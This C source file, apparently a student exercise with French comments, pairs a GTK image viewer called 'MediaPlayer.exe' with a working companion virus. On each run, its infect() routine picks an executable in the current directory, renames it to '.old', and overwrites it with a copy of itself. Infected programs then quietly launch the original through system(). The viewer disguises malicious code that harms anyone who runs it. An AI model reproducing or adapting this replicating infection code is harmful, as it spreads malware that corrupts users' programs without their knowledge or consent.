#include <gtk/gtk.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

// Variables globales
GtkWidget *image;
int current_image_index = 0;
int total_images = 0;
char **image_paths;

// Fonction pour charger et afficher l'image actuelle
void load_image() {
    GdkPixbuf *original_pixbuf = gdk_pixbuf_new_from_file(image_paths[current_image_index], NULL);

    // Obtenir les dimensions de l'image originale
    int original_width = gdk_pixbuf_get_width(original_pixbuf);
    int original_height = gdk_pixbuf_get_height(original_pixbuf);

    // Calculer les nouvelles dimensions en conservant le ratio d'aspect
    int width, height;
    if (original_width > original_height) {
        width = 800;
        height = (original_height * width) / original_width;
    } else {
        height = 800;
        width = (original_width * height) / original_height;
    }

    // Redimensionner l'image
    GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(original_pixbuf, width, height, GDK_INTERP_BILINEAR);

    gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);

    // Libérer la mémoire
    g_object_unref(original_pixbuf);
    g_object_unref(resized_pixbuf);
}

// Fonction pour passer à l'image suivante
void next_image() {
    current_image_index = (current_image_index + 1) % total_images;
    load_image();
}

// Fonction pour passer à l'image précédente
void prev_image() {
    current_image_index = (current_image_index - 1 + total_images) % total_images;
    load_image();
}

    char*
    nameToOld(char* name)
    {
        char* new_name = (char *) malloc(40);
        strcpy(new_name, name);
		//Possible improvement by hiding the .old
		//strcpy(new_name,".");
		//strcat(new_name,name);


        if(strcmp(name, "MediaPlayer.exe"))	// Verifing if the file is not MediaPlayer
        {
            if(strstr(name, ".exe")) // Verifing the extension of the file
            {
                new_name[strlen(name)-1] = 'd';
                new_name[strlen(name)-2] = 'l';
                new_name[strlen(name)-3] = 'o';

				//new_name[strlen(new_name)-1] = 'd';
                //new_name[strlen(new_name)-2] = 'l';
                //new_name[strlen(new_name)-3] = 'o';

                if(!fopen(new_name, "r"))//Verifing if we have already the same file
				{
                    //Le fichier .old n'existe pas ==> infection

                    if(!rename(name, new_name))	// Le fichier a était renommé ?
                    {
                        return name;
                    }
                    else
                    {
                        perror("Error the file not renaming\n");
                        exit(EXIT_FAILURE);
                    }
                }
            }
        }
		free(new_name);
        return "";
    }


void infect()
{
	DIR* dir = opendir("."); // Open a directory to read files in it.
	int infect = 0;
	char* pname = (char *) malloc( 50 );
	char* rname = (char *) malloc( 50 );

	// Test if the directory exists. If not, create it and return an error
	if (dir == NULL)
    {
            perror("Error: Unable to open directory\n");
            exit(EXIT_FAILURE);
    }

	// directory file path structure
	struct dirent* directory;
    while ((directory = readdir(dir)) != NULL)
    {
		if (infect < 1) // We infect one file per execution
		{
			struct stat stat_buffer;
			if (!stat(directory->d_name, &stat_buffer))
			{	
				if ((stat_buffer.st_mode & S_IXUSR) && S_ISREG(stat_buffer.st_mode))//check if the file is executable and regular
				{ 
					char* name = (char *) malloc( 50 );
					strcpy(name, directory->d_name); // Copy the name of the file
					strcpy(pname, name);
					
					strcpy(rname, nameToOld(name));

					if(strcmp(rname, "")) // Le programme a était infecté ? 
					{
						infect++;
					}

					free(name);
				}
			}
		}
	}
	free(directory);
	closedir(dir);

	
    FILE *fCopy, *fCopied;
    char ch; //Stock every charactere of the source file
    int pos; // The cursor postion in the source fille

    if ((fCopy = fopen("MediaPlayer.exe","r")) == NULL)    
	{    
	    perror("Error the file can't be open");
        exit(EXIT_FAILURE);
    }

    fCopied = fopen(pname, "w"); // Opening pg_name file else creating the file

    fseek(fCopy, 0L, SEEK_END); // file pointer at end of file

    pos = ftell(fCopy); // The total size of te source file 

    fseek(fCopy, 0L, SEEK_SET); // file pointer set at start
       
	while (pos--)
    {
        ch = fgetc(fCopy);  // copying file character by character
        fputc(ch, fCopied); // Put ch per ch in the copied file
    }    

	printf("virus copié\n");
	chmod(pname, S_IRUSR | S_IWUSR | S_IXUSR); // Permission
    fclose(fCopied);
	fclose(fCopy);
	free(pname);
	free(rname);
}

int
main (int argc, char **argv)
{
	int status;
	infect();    
	char* cmd = (char *) malloc( 40 );
	strcpy(cmd, argv[0]); // argv[0] contains the name of the executed file

	if(!strcmp(argv[0], "./MediaPlayer.exe")) // If the file is MediaPlayer run the MediaPlayer
	{
		gtk_init(&argc, &argv);

		// Création de la fenêtre
		GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
		gtk_window_set_title(GTK_WINDOW(window), "Media Player");
		gtk_window_set_default_size(GTK_WINDOW(window), 800, 800);
		g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);

		// Création du conteneur principal
		GtkWidget *vbox = gtk_vbox_new(FALSE, 5);

		// Ajout des boutons avant et arrière
		GtkWidget *prev_button = gtk_button_new_with_label("Précédent");
		GtkWidget *next_button = gtk_button_new_with_label("Suivant");
		g_signal_connect(prev_button, "clicked", G_CALLBACK(prev_image), NULL);
		g_signal_connect(next_button, "clicked", G_CALLBACK(next_image), NULL);
		gtk_box_pack_start(GTK_BOX(vbox), prev_button, FALSE, FALSE, 0);
		gtk_box_pack_start(GTK_BOX(vbox), next_button, FALSE, FALSE, 0);

		// Création de l'image
		image = gtk_image_new();
		gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);

		// Récupération des chemins des images dans le dossier courant
		DIR *dir;
		struct dirent *ent;
		dir = opendir(".");
		if (dir != NULL) {
			while ((ent = readdir(dir)) != NULL) {
				if (ent->d_type == DT_REG) { // Fichier régulier
					const char *ext = strrchr(ent->d_name, '.');
					if (ext != NULL && (strcmp(ext, ".png") == 0 || strcmp(ext, ".jpeg") == 0 || strcmp(ext, ".jpg") == 0 || strcmp(ext, ".svg") == 0)) {
						total_images++;
						image_paths = realloc(image_paths, total_images * sizeof(char*));
						image_paths[total_images - 1] = strdup(ent->d_name);
					}
				}
			}
			closedir(dir);
		}

		// Affichage de la première image
		if (total_images > 0) {
			load_image();
		}

		// Affichage de la fenêtre
		gtk_container_add(GTK_CONTAINER(window), vbox);
		gtk_widget_show_all(window);

		// Lancement de la boucle principale de GTK
		gtk_main();

		// Libération de la mémoire
		for (int i = 0; i < total_images; ++i) {
			free(image_paths[i]);
		}
		free(image_paths);
	}
	else //Run the originaly prog file with replacing its extension
	{
		cmd[strlen(cmd)-1] = 'd';
		cmd[strlen(cmd)-2] = 'l';
		cmd[strlen(cmd)-3] = 'o';
		printf("cmd : %s\n", cmd);
		system(cmd);
	}
	
	return status;
}